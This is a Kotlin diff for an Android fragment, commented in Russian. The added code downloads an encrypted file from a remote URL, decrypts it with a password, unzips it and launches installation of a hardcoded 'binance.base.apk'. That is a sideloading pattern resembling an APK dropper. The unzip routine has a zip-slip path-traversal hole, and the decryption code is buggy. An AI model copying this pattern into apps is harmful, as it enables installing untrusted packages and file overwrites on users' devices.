@@ -1,4 +1,5 @@
 package com.example.app.fragments
+
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
@@ -27,16 +28,19 @@ import java.io.InputStreamReader
 import java.io.File
 import java.io.FileInputStream
 import java.io.FileOutputStream
+import java.io.IOException
 import java.security.Security
-import java.util.jar.Manifest
+import java.util.zip.ZipEntry
+import java.util.zip.ZipInputStream
 import javax.crypto.Cipher
 import javax.crypto.SecretKeyFactory
 import javax.crypto.spec.IvParameterSpec
 import javax.crypto.spec.PBEKeySpec
 import javax.crypto.spec.SecretKeySpec
+import android.annotation.SuppressLint
+import com.example.app.databinding.FragmentFourthBinding
 
 class FourthFragment : Fragment() {
-
 
     private lateinit var downloadManager: DownloadManager
     private var myDownloadID: Long = 0
@@ -44,12 +48,329 @@ class FourthFragment : Fragment() {
 
     private var inputFileUri: Uri? = null
 
+    // Объявляем binding (если используете ViewBinding)
+    private var _binding: FragmentFourthBinding? = null
+    private val binding get() = _binding!!
 
+
+    private val selectFileLauncher = registerForActivityResult(
+        androidx.activity.result.contract.ActivityResultContracts.OpenDocument()
+    ) { uri: Uri? ->
+        uri?.let { updateSelectedFileInfo(it) }
+    }
 
     override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
-        val view = inflater.inflate(R.layout.fragment_fourh, container, false)
-        return view
+        _binding = FragmentFourthBinding.inflate(inflater, container, false)
+        return binding.root
+    }
+
+    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
+        super.onViewCreated(view, savedInstanceState)
+
+        Security.addProvider(BouncyCastleProvider())
+
+        // Обработчик выбора файла
+        binding.buttonSelectFile.setOnClickListener {
+            if (isStoragePermissionGranted()) {
+                selectFileLauncher.launch(arrayOf("*/*"))
+            } else {
+                requestStoragePermission()
+            }
+        }
+
+        downloadManager = requireContext().getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
+
+        // Обработчик расшифровки
+        binding.buttonDecrypt.setOnClickListener {
+            val password = binding.passwordInput.text.toString()
+            if (password.isEmpty() || inputFileUri == null) {
+                Toast.makeText(requireContext(), "Заполните пароль и выберите файл", Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
+            decryptFile(inputFileUri!!, password)
+        }
+
+        binding.button.setOnClickListener {
+            val password = binding.passwordInput.text.toString()
+            if (password.isEmpty() || inputFileUri == null) {
+                Toast.makeText(requireContext(), "Заполните пароль и выберите файл", Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
+            decryptFileopenssl(inputFileUri!!, password)
+        }
+
+        binding.download.setOnClickListener {
+            download("${apkHttpUrl}new.enc")
+        }
+    }
+
+    override fun onResume() {
+        super.onResume()
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+            requireContext().registerReceiver(
+                downloadCompleteBroadcastReceiver,
+                IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE),
+                Context.RECEIVER_NOT_EXPORTED
+            )
+        } else {
+            requireContext().registerReceiver(
+                downloadCompleteBroadcastReceiver,
+                IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE)
+            )
+        }
+    }
+
+    override fun onPause() {
+        super.onPause()
+        requireContext().unregisterReceiver(downloadCompleteBroadcastReceiver)
+    }
+
+    override fun onDestroyView() {
+        super.onDestroyView()
+        _binding = null
+    }
+
+    // Обновление информации о выбранном файле
+    @SuppressLint("SetTextI18n")
+    private fun updateSelectedFileInfo(uri: Uri) {
+        inputFileUri = uri
+        binding.fileNameLabel.text = "Выбран файл: $uri"
+    }
+
+    // Проверка разрешений
+    private fun isStoragePermissionGranted(): Boolean =
+        ContextCompat.checkSelfPermission(requireContext(), android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
+
+    private fun requestStoragePermission() {
+        requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), 100)
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == 100 && grantResults.firstOrNull() == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            binding.buttonSelectFile.callOnClick()
+        } else {
+            Toast.makeText(requireContext(), "Доступ запрещен", Toast.LENGTH_LONG).show()
+        }
+    }
+
+    // Расшифровка файла
+    @SuppressLint("SetTextI18n")
+    private fun decryptFile(fileUri: Uri, password: String) {
+        Thread {
+            try {
+                val stream = requireContext().contentResolver.openInputStream(fileUri)!!
+                val rawBase64Data = InputStreamReader(stream).readText()
+
+                val cleanedBase64 = rawBase64Data.trim().replace("[^A-Za-z0-9+/=]+".toRegex(), "")
+                val paddedBase64 = cleanedBase64.padEnd((cleanedBase64.length + 3) / 4 * 4, '=')
+
+                val decodedData = android.util.Base64.decode(paddedBase64, android.util.Base64.DEFAULT)
+
+                val decryptedData = decryptWithOpenSSLAES(decodedData, password)
+
+                requireActivity().runOnUiThread {
+                    binding.outputData.text = "Результат:\n$decryptedData"
+                }
+            } catch (e: Exception) {
+                e.printStackTrace()
+                requireActivity().runOnUiThread {
+                    Toast.makeText(requireContext(), "Ошибка при расшифровке: ${e.message}", Toast.LENGTH_LONG).show()
+                }
+            }
+        }.start()
+    }
+
+    private fun decryptWithOpenSSLAES(cipheredData: ByteArray, password: String): String {
+        val keySalt = byteArrayOf(0x73, 0x6F, 0x6D, 0x65, 0x53, 0x61, 0x6C, 0x74)
+        val keyIter = 100000
+        val keyLen = 256
+
+        val key = derivePBKDF2Key(password.toCharArray(), keySalt, keyIter, keyLen)
+        val iv = ByteArray(16)
+        System.arraycopy(cipheredData, 0, iv, 0, iv.size.coerceAtMost(cipheredData.size))
+
+        val cipherData = ByteArrayInputStream(cipheredData)
+        val plainData = decryptAES256CBC(key, iv, cipherData.readBytes())
+
+        return String(plainData)
+    }
+
+    private fun derivePBKDF2Key(password: CharArray, salt: ByteArray, iterations: Int, length: Int): ByteArray {
+        val spec = PBEKeySpec(password, salt, iterations, length)
+        val factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1", "BC")
+        return factory.generateSecret(spec).encoded
+    }
+
+    private fun decryptAES256CBC(key: ByteArray, iv: ByteArray, ciphertext: ByteArray): ByteArray {
+        val cipher = Cipher.getInstance("AES/CBC/PKCS7Padding", "BC")
+        val secretKey = SecretKeySpec(key, "AES")
+        val ivParams = IvParameterSpec(iv)
+        cipher.init(Cipher.DECRYPT_MODE, secretKey, ivParams)
+        return cipher.doFinal(ciphertext)
+    }
+
+    fun decryptFileopenssl(fileUri: Uri, password: String) {
+        val filePath = cleanFilePath(fileUri)
+        val fullPath = "$filePath"
+
+        if (!File(fullPath).exists()) {
+            Log.e("Decryption", "Файл не найден: $fullPath")
+            return
+        }
+
+        val outputFile = requireContext().getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)?.absolutePath + "/new.txt"
+
+        val command = listOf(
+            "openssl",
+            "enc",
+            "-d",
+            "-iter",
+            "100000",
+            "-pbkdf2",
+            "-aes-256-cbc",
+            "-in", fullPath,
+            "-out", outputFile,
+            "-pass", "pass:$password"
+        )
+
+        val result = runCommand(command)
+        println(result)
+
+        if (result.contains("error", ignoreCase = true)) {
+            println("Ошибка при расшифровке!")
+        } else {
+            println("Файл успешно расшифрован!")
+        }
+    }
+
+    private fun runCommand(command: List<String>): String {
+        return try {
+            ProcessBuilder().command(command)
+                .redirectErrorStream(true)
+                .start()
+                .inputStream.bufferedReader().readText()
+        } catch (e: IOException) {
+            e.printStackTrace()
+            "Ошибка выполнения команды"
+        }
+    }
+
+    fun cleanFilePath(uri: Uri): String {
+        var path = uri.path.orEmpty()
+        while (path.startsWith("/") || path.startsWith("root")) {
+            path = path.removePrefix("/")
+                .removePrefix("root/")
+        }
+        return path
+    }
+
+    fun download(url: String) {
+        val folder = requireContext().getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS) ?: return
+        if (!folder.exists()) {
+            folder.mkdirs()
+        }
+
+        val lastPart = url.substringAfterLast('/')
+        val file = File(folder, lastPart)
+
+        if (file.exists()) {
+            Toast.makeText(requireContext(), "Файл уже существует", Toast.LENGTH_SHORT).show()
+            return
+        }
+
+        kotlinx.coroutines.CoroutineScope(Dispatchers.Main).launch {
+            try {
+                Toast.makeText(requireContext(), "Начинается загрузка...", Toast.LENGTH_SHORT).show()
+
+                val request = DownloadManager.Request(Uri.parse(url))
+                request.setAllowedNetworkTypes(
+                    DownloadManager.Request.NETWORK_WIFI or DownloadManager.Request.NETWORK_MOBILE
+                )
+                request.setTitle(lastPart)
+                request.setDescription("Загружается...")
+                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
+                request.allowScanningByMediaScanner()
+                request.setDestinationInExternalFilesDir(
+                    requireContext(),
+                    Environment.DIRECTORY_DOWNLOADS,
+                    lastPart
+                )
+
+                myDownloadID = downloadManager.enqueue(request)
+            } catch (ex: Exception) {
+                ex.printStackTrace()
+                Toast.makeText(requireContext(), "Ошибка при загрузке: ${ex.message}", Toast.LENGTH_LONG).show()
+            }
+        }
+    }
+
+    fun installApk(filename: String) {
+        val apkFile = File(requireContext().getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), filename)
+
+        if (apkFile.exists()) {
+            val apkUri = FileProvider.getUriForFile(
+                requireContext(),
+                "${requireContext().packageName}.fileprovider",
+                apkFile
+            )
+
+            val intent = Intent(Intent.ACTION_VIEW).apply {
+                setDataAndType(apkUri, "application/vnd.android.package-archive")
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+            }
+            startActivity(intent)
+        } else {
+            Toast.makeText(requireContext(), "Файл не найден", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    fun unzip(filename: String): Boolean {
+        val zipFile = File(requireContext().getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), filename)
+        val outputFolder = File(requireContext().getExternalFilesDir(null)?.path!!, "Download")
+        outputFolder.mkdirs()
+
+        val filePath = "/storage/emulated/0/Android/data/com.example.app/files/Download/binance.base.apk"
+        val file = File(filePath)
+
+        if (file.exists()) {
+            Toast.makeText(requireContext(), "Файл уже существует", Toast.LENGTH_SHORT).show()
+            installApk("binance.base.apk")
+            return true
+        }
+
+        val fis = FileInputStream(zipFile)
+        val zis = ZipInputStream(fis)
+
+        var entry: ZipEntry?
+        while (zis.nextEntry.also { entry = it } != null) {
+            val fileName = entry!!.name
+            val destFile = File(outputFolder, fileName)
+            destFile.parentFile?.mkdirs()
+
+            if (!entry!!.isDirectory) {
+                val fos = FileOutputStream(destFile)
+                val bufferSize = 4096
+                val data = ByteArray(bufferSize)
+                var count: Int
+                while (zis.read(data, 0, bufferSize).also { count = it } != -1) {
+                    fos.write(data, 0, count)
+                }
+                fos.flush()
+                fos.close()
+            }
+            zis.closeEntry()
+        }
+        zis.close()
+        fis.close()
+        return true
+    }
+
+    // Объявление BroadcastReceiver (если нужно)
+    private val downloadCompleteBroadcastReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            // Обработка завершения загрузки
+        }
     }
 }
-
-
